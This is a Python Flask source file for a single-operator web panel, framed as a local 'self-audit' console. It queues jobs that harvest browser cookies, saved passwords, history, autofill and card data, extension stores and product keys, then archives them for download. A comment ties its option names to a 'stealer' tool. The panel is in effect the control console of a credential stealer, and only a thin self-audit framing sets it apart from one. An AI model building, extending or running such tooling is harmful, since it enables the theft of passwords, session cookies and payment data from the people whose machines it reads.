"""Self-audit web panel - run your own capture against your own machine.

Single-user. The operator is the only account; there is no multi-victim builder,
no per-user workspaces, and nothing here produces a remote implant. It exists so
you can:

  1. log in on localhost,
  2. probe what this box can actually read (python jwg.py --probe equivalent),
  3. run the capture against THIS machine,
  4. browse past runs and download their archives to inspect locally.

Why it is built this way (all deliberate):

  * Password hashed with PBKDF2-HMAC-SHA256 + salt, never plaintext. Session
    signing secret is random per start unless you pin PANEL_SECRET, so cookies
    die on restart by default.
  * First login bootstraps the one account from PANEL_USER/PANEL_PASS (or a
    generated password printed at startup). No seeded credentials.
  * Captures run in a background queue (one worker thread), not inside the
    request, because profile reads + archive build take seconds and would hang
    the HTTP connection.
  * Run artifacts live under panel_data/runs/. Downloads check the run id only;
    everything on disk here belongs to this machine's owner.

Bind stays loopback unless you pass an explicit host AND set PANEL_SECRET; a
routable bind without a pinned secret is refused. Don't expose this anyway - it
reads real browser stores on whatever box it runs on.
"""
from __future__ import annotations

import hashlib
import hmac
import json
import os
import re
import secrets
import shutil
import sys
import tempfile
import threading
import time
import zipfile
from dataclasses import dataclass, field, asdict
from functools import wraps

try:
    from flask import (Flask, Response, abort, jsonify, redirect,
                       render_template_string, request, send_file, session, url_for)
except ImportError:
    Flask = None

HERE = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(HERE, "panel_data")
DB_FILE = os.path.join(DATA_DIR, "db.json")
RUNS_DIR = os.path.join(DATA_DIR, "runs")

# Which collectors the audit runs. Keys match stealer toggle names so the same
# cfg shape works if you script jwg.py directly.
CAPTURE_OPTIONS = {
    "system_info":   "System Info",
    "cookies":       "Browser Cookies",
    "passwords":     "Saved Passwords",
    "history":       "Browsing History",
    "autofill":      "Autofill / Cards",
    "extensions":    "Extension Stores (raw)",
    "product_keys":  "Product Keys",
    "software_list": "Installed Software",
}


# ------------------------------------------------------------------ password hashing
def hash_password(pw: str, salt: bytes | None = None) -> tuple[str, str]:
    """PBKDF2-HMAC-SHA256, 210k iters. Returns (hex_hash, hex_salt)."""
    salt = salt or secrets.token_bytes(16)
    dk = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), salt, 210_000)
    return dk.hex(), salt.hex()


def verify_password(pw: str, stored_hash: str, salt_hex: str) -> bool:
    try:
        salt = bytes.fromhex(salt_hex)
    except ValueError:
        return False
    dk = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), salt, 210_000)
    return hmac.compare_digest(dk.hex(), stored_hash)


# ------------------------------------------------------------------ store
@dataclass
class Operator:
    id: str
    username: str
    pw_hash: str
    pw_salt: str
    created: float = field(default_factory=time.time)


@dataclass
class Run:
    id: str
    status: str            # queued | running | done | failed
    created: float
    label: str = ""
    error: str | None = None
    artifact: str | None = None
    counts: dict = field(default_factory=dict)
    options: dict = field(default_factory=dict)


class Store:
    """JSON-file store guarded by a process lock. Small scale by design."""

    def __init__(self, path: str):
        self.path = path
        self.lock = threading.RLock()
        self._db: dict = {"operator": None, "runs": {}}
        self._load()

    def _load(self) -> None:
        if os.path.isfile(self.path):
            try:
                self._db = json.load(open(self.path, encoding="utf-8"))
            except Exception:
                pass
        self._db.setdefault("operator", None)
        self._db.setdefault("runs", {})

    def _save(self) -> None:
        tmp = self.path + ".tmp"
        json.dump(self._db, open(tmp, "w", encoding="utf-8"), indent=2)
        os.replace(tmp, self.path)

    # ---- operator ----
    def get_operator(self) -> dict | None:
        return self._db.get("operator")

    def set_operator(self, username: str, password: str) -> dict:
        with self.lock:
            if not re.fullmatch(r"[A-Za-z0-9_.-]{3,32}", username.strip()):
                raise ValueError("username: 3-32 chars, letters/digits/._- only")
            if len(password) < 8:
                raise ValueError("password must be >= 8 characters")
            h, s = hash_password(password)
            op = asdict(Operator(id=secrets.token_hex(8), username=username.strip(),
                                 pw_hash=h, pw_salt=s))
            self._db["operator"] = op
            self._save()
            return op

    # ---- runs ----
    def add_run(self, run: dict) -> None:
        with self.lock:
            self._db["runs"][run["id"]] = run
            self._save()

    def update_run(self, rid: str, **kw) -> None:
        with self.lock:
            r = self._db["runs"].get(rid)
            if r:
                r.update(kw)
                self._save()

    def list_runs(self) -> list[dict]:
        return sorted(self._db["runs"].values(), key=lambda r: r.get("created", 0), reverse=True)

    def get_run(self, rid: str) -> dict | None:
        return self._db["runs"].get(rid)


os.makedirs(RUNS_DIR, exist_ok=True)
store = Store(DB_FILE)


# ------------------------------------------------------------------ capture queue
_QUEUE: "list[str]" = []
_QCV = threading.Condition()


def enqueue(run_id: str) -> None:
    with _QCV:
        _QUEUE.append(run_id)
        _QCV.notify()


def _worker() -> None:
    while True:
        with _QCV:
            while not _QUEUE:
                _QCV.wait()
            rid = _QUEUE.pop(0)
        try:
            run_capture(rid)
        except Exception as e:
            store.update_run(rid, status="failed", error=f"{type(e).__name__}: {e}")


def run_capture(rid: str) -> None:
    """Execute one local audit: probe -> capture -> archive into runs/<id>/.

    Reuses the verified readers in capture.py/sysinfo.py/report.py. Nothing is
    sent anywhere; the archive is written for the operator to inspect locally.
    """
    run = store.get_run(rid)
    if not run:
        return
    store.update_run(rid, status="running")

    import capture
    import probe
    import report
    import sysinfo

    stage = tempfile.mkdtemp(prefix="jwg_run_")
    try:
        rows = probe.run_all()
        caps = []
        opts = run.get("options", {})
        wanted = [k for k, v in opts.items() if v] or list(CAPTURE_OPTIONS.keys())
        readers = {
            "cookies":    capture.capture_chromium,
            "passwords":  capture.capture_chromium,   # logins ride the chromium pass
            "extensions": capture.capture_extension_stores,
        }
        ran_firefox = False
        for k in wanted:
            fn = readers.get(k)
            if fn is None:
                continue
            if fn is capture.capture_chromium and any(
                    c.kind.startswith("chromium") for c in caps):
                continue          # one chromium pass covers cookies + logins
            try:
                got = fn(stage)
                caps.extend(got)
                ran_firefox = ran_firefox or any(c.kind.startswith("firefox") for c in got)
            except Exception as e:
                caps.append(_err_cap(k, e))
        if ("cookies" in wanted or "passwords" in wanted) and not ran_firefox:
            try:
                caps.extend(capture.capture_firefox(stage))
            except Exception as e:
                caps.append(_err_cap("firefox", e))

        system = sysinfo.gather()
        report.write_items(stage, caps)
        text = report.render_report(caps, system, rows)

        out_zip = os.path.join(RUNS_DIR, f"{rid}.zip")
        arch, size, nfiles = report.build_archive(stage, out_zip, caps)
        # keep the human-readable report + probe output inside the archive too
        with zipfile.ZipFile(arch, "a", zipfile.ZIP_DEFLATED) as z:
            z.writestr("report.md", text)
            z.writestr("probe.json", json.dumps(rows, indent=2, default=str))

        counts = {c.kind: c.count for c in caps if c.count}
        store.update_run(rid, status="done", artifact=arch, counts=counts, error=None)
    finally:
        shutil.rmtree(stage, ignore_errors=True)


def _err_cap(label: str, exc: Exception):
    import capture
    c = capture.Capture(f"{label}:ERROR")
    c.note = f"{type(exc).__name__}: {exc}"
    return c


threading.Thread(target=_worker, daemon=True).start()


# ------------------------------------------------------------------ templates
BASE_CSS = """
*{box-sizing:border-box}body{margin:0;background:#0b0d10;color:#e8eaed;
font:14px/1.5 -apple-system,'Segoe UI',Roboto,sans-serif}
.wrap{max-width:880px;margin:0 auto;padding:32px 20px}
.brand{font-weight:800;letter-spacing:.12em;color:#f06292;font-size:20px}
.card{background:#12151a;border:1px solid #22262d;border-radius:12px;padding:18px;margin-bottom:16px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
.chk{display:flex;gap:8px;align-items:center;font-size:13px;color:#c3c8d0}
input[type=text],input[type=password]{width:100%;background:#12151a;border:1px solid #22262d;
 color:#e8eaed;padding:10px 12px;border-radius:8px;font:inherit}
label.fld{display:block;font-size:11px;color:#8b93a1;text-transform:uppercase;letter-spacing:.05em;margin:0 0 5px}
button{background:#f06292;color:#111;border:0;padding:11px 20px;border-radius:8px;font:inherit;
 font-weight:800;cursor:pointer;letter-spacing:.04em}
.btnbig{width:100%;padding:16px;font-size:15px;letter-spacing:.14em}
.row{display:flex;gap:12px;align-items:center}
.nav{display:flex;gap:8px;margin:10px 0 22px}
.nav a{padding:8px 14px;border-radius:8px;background:#12151a;border:1px solid #22262d;color:#c3c8d0}
.nav a.on{background:#f06292;color:#111;border-color:#f06292;font-weight:700}
table{width:100%;border-collapse:collapse;font-size:13px}
th,td{text-align:left;padding:9px 10px;border-bottom:1px solid #1c2027}
th{color:#8b93a1;font-weight:600;text-transform:uppercase;font-size:11px;letter-spacing:.05em}
.pill{padding:2px 9px;border-radius:20px;font-size:11px;font-weight:700}
.pill.done{background:#12351f;color:#3fb950}.pill.running,.pill.queued{background:#2a2410;color:#e3b341}
.pill.failed{background:#3a1416;color:#f85149}
.muted{color:#6b7280;font-size:12px}.status{font-size:12px;color:#8b93a1;margin:6px 0 14px}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#f06292;margin-right:6px}
.err{color:#f85149;background:#201113;border:1px solid #3a1416;padding:10px 12px;border-radius:8px;margin-bottom:14px}
.ok{color:#3fb950;background:#0f2016;border:1px solid #12351f;padding:10px 12px;border-radius:8px;margin-bottom:14px}
"""

LOGIN_TPL = """<!doctype html><meta charset=utf-8><title>Self-Audit</title><style>{{css}}</style>
<div class=wrap style="max-width:420px">
 <div class=brand>SELF-AUDIT</div>
 <p class=muted style="text-align:center;margin-bottom:22px">local capture console</p>
 {%if setup%}<div class=ok>First run: pick a username and a password (8+ chars).</div>{%endif%}
 {%if err%}<div class=err>{{err}}</div>{%endif%}
 <form method=post>
  <div class=card>
   <label class=fld>Username</label><input name=u type=text autocomplete=username required>
   <div style="height:12px"></div>
   <label class=fld>Password</label><input name=p type=password autocomplete=current-password required>
  </div>
  <button class=btnbig type=submit>SIGN IN</button>
 </form>
</div>"""

APP_TPL = """<!doctype html><meta charset=utf-8><title>Self-Audit</title><style>{{css}}</style>
<div class=wrap>
 <div class=row style="justify-content:space-between">
   <div class=brand style="font-size:24px">SELF-AUDIT</div>
   <div class=muted>{{user.username}} &nbsp; <a href=/logout>sign out</a></div>
 </div>
 <div class=nav>
   <a class="{{'on' if tab=='capture' else ''}}" href=/>Capture</a>
   <a class="{{'on' if tab=='runs' else ''}}" href=/runs>Runs</a>
 </div>
 {{body|safe}}
</div>"""

CAPTURE_TPL = """
{%if msg%}<div class=ok>{{msg}}</div>{%endif%}
{%if err%}<div class=err>{{err}}</div>{%endif%}
<div class=status><span class=dot></span>this machine only - nothing leaves it unless you copy it out</div>
<form method=post action=/capture>
 <div class=card>
   <h3>What to read</h3>
   <div class=grid>
     {%for k,label in options.items()%}
       <label class=chk><input type=checkbox name="c_{{k}}" {{checks[k]}}> {{label}}</label>
     {%endfor%}
   </div>
 </div>
 <button class=btnbig type=submit>RUN CAPTURE</button>
</form>
"""

RUNS_TPL = """
{%if msg%}<div class=ok>{{msg}}</div>{%endif%}
<div class=card>
 <h3>History</h3>
 {%if not runs%}<p class=muted>none yet.</p>{%else%}
 <table><tr><th>when</th><th>status</th><th>items</th><th></th></tr>
 {%for r in runs%}
 <tr>
   <td class=muted>{{r.when}}</td>
   <td><span class="pill {{r.status}}">{{r.status}}</span>
       {%if r.status=='failed'%}<div class=muted>{{r.error or ''}}</div>{%endif%}</td>
   <td class=muted>{{r.summary}}</td>
   <td>{%if r.status=='done' and r.artifact%}<a href="/download/{{r.id}}">archive</a>{%endif%}</td>
 </tr>
 {%endfor%}</table>
 <p class=muted>Auto-refreshes while a capture runs.</p>
 {%endif%}
</div>
<script>setTimeout(()=>location.reload(),3000);</script>
"""


# ------------------------------------------------------------------ auth helpers
def current_user() -> dict | None:
    uid = session.get("uid")
    if not uid:
        return None
    op = store.get_operator()
    if op and op["id"] == uid and not op.get("disabled"):
        return op
    return None


def login_required(fn):
    @wraps(fn)
    def inner(*a, **kw):
        if not current_user():
            return redirect(url_for("login", next=request.path))
        return fn(*a, **kw)
    return inner


# ------------------------------------------------------------------ app factory
DEFAULT_CHECKS = {k: k in ("system_info", "cookies", "passwords", "history",
                           "extensions") for k in CAPTURE_OPTIONS}


def create_app(secret: str | None = None):
    if Flask is None:
        raise RuntimeError("flask not installed: pip install flask")
    app = Flask(__name__)
    app.secret_key = secret or os.environ.get("PANEL_SECRET") or secrets.token_bytes(32)

    def render(body_html: str, tab: str) -> Response:
        u = current_user()
        html = render_template_string(APP_TPL, css=BASE_CSS, body=body_html,
                                      user=u, tab=tab)
        return Response(html, mimetype="text/html")

    # ---- auth ----
    @app.route("/login", methods=["GET", "POST"])
    def login():
        err = ""
        op = store.get_operator()
        first = op is None
        if request.method == "POST":
            uname = request.form.get("u", "")
            pw = request.form.get("p", "")
            if first:
                try:
                    op = store.set_operator(uname, pw)
                except ValueError as e:
                    return Response(render_template_string(
                        LOGIN_TPL, css=BASE_CSS, err=str(e), setup=True),
                        mimetype="text/html")
            if op and op["username"].lower() == uname.strip().lower() \
                    and verify_password(pw, op["pw_hash"], op["pw_salt"]):
                session["uid"] = op["id"]
                return redirect(request.args.get("next") or "/")
            err = err or "bad username or password"
        html = render_template_string(LOGIN_TPL, css=BASE_CSS, err=err, setup=first)
        return Response(html, mimetype="text/html")

    @app.get("/logout")
    def logout():
        session.clear()
        return redirect(url_for("login"))

    # ---- capture page ----
    @app.get("/")
    @login_required
    def home():
        checks = {k: "checked" if DEFAULT_CHECKS[k] else "" for k in CAPTURE_OPTIONS}
        body = render_template_string(CAPTURE_TPL, options=CAPTURE_OPTIONS, checks=checks,
                                      msg=request.args.get("msg", ""),
                                      err=request.args.get("err", ""))
        return render(body, "capture")

    @app.post("/capture")
    @login_required
    def do_capture():
        opts = {k: bool(request.form.get(f"c_{k}")) for k in CAPTURE_OPTIONS}
        if not any(opts.values()):
            return redirect(url_for("home", err="pick at least one store"))
        run = asdict(Run(id=secrets.token_hex(8), status="queued",
                         created=time.time(), options=opts))
        store.add_run(run)
        enqueue(run["id"])
        return redirect(url_for("runs", msg=f"queued: {run['id']}"))

    # ---- runs ----
    @app.get("/runs")
    @login_required
    def runs():
        rows = []
        for r in store.list_runs():
            total = sum(r.get("counts", {}).values())
            rows.append({**r,
                         "when": time.strftime("%Y-%m-%d %H:%M", time.localtime(r["created"])),
                         "summary": f"{total} item(s)" if r.get("counts") else "-"})
        body = render_template_string(RUNS_TPL, runs=rows, msg=request.args.get("msg", ""))
        return render(body, "runs")

    @app.get("/download/<rid>")
    @login_required
    def download(rid):
        r = store.get_run(rid)
        if not r or r.get("status") != "done":
            abort(404)
        p = r.get("artifact")
        if not p or not os.path.isfile(p):
            abort(404, description="artifact gone")
        return send_file(p, as_attachment=True, download_name=os.path.basename(p),
                         mimetype="application/zip")

    @app.get("/api/runs")
    @login_required
    def api_runs():
        return jsonify(store.list_runs())

    return app


# ------------------------------------------------------------------ entrypoint
if __name__ == "__main__":
    host = os.environ.get("PANEL_HOST", "127.0.0.1")
    port = int(os.environ.get("PANEL_PORT", "8787"))
    loopback = host in ("127.0.0.1", "localhost", "::1")
    pinned = os.environ.get("PANEL_SECRET")
    if not loopback and not pinned:
        print("[fatal] refusing routable bind without PANEL_SECRET. "
              "This console reads live browser stores on its own box.", file=sys.stderr)
        raise SystemExit(1)

    app = create_app()
    op = store.get_operator()
    if op is None:
        pw = os.environ.get("PANEL_ADMIN_PASS", "")
        if not pw:
            pw = secrets.token_urlsafe(12)
            print(f"[panel] first run - admin password: {pw}")
        store.set_operator(os.environ.get("PANEL_ADMIN_USER", "admin"), pw)
    print(f"[panel] open http://{host}:{port}  (loopback audit console)")
    app.run(host=host, port=port, threaded=True)
